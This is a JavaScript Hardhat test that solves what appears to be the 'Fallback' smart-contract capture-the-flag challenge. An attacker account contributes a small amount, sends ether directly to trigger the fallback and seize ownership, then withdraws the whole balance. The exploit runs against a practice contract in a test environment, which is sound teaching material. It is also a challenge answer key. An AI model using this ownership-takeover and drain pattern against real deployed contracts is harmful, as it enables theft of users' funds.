const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

const CONTRACT_NAME = "Fallback";
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Fallback = await ethers.getContractFactory(CONTRACT_NAME);
    const fallback = await Fallback.deploy();

    return { fallback, attacker };
  }

  it("Challenge Solved", async function () {
    let tx;
    let { fallback, attacker } = await loadFixture(deployLoadFixture);

    fallback = fallback.connect(attacker);

    // contribute
    tx = await fallback.contribute({ value: 1 });
    await tx.wait();

    // Take ownership of the contract by sending some ether
    tx = await attacker.sendTransaction({
      to: fallback.address,
      value: 1,
    });
    await tx.wait();

    // Withdraw the contract's balance
    tx = await fallback.withdraw();
    await tx.wait();

    // Test
    const owner = await fallback.owner();
    const balance = await ethers.provider.getBalance(fallback.address);
    expect(owner).to.equal(attacker.address);
    expect(balance).to.equal(0);
  });
});
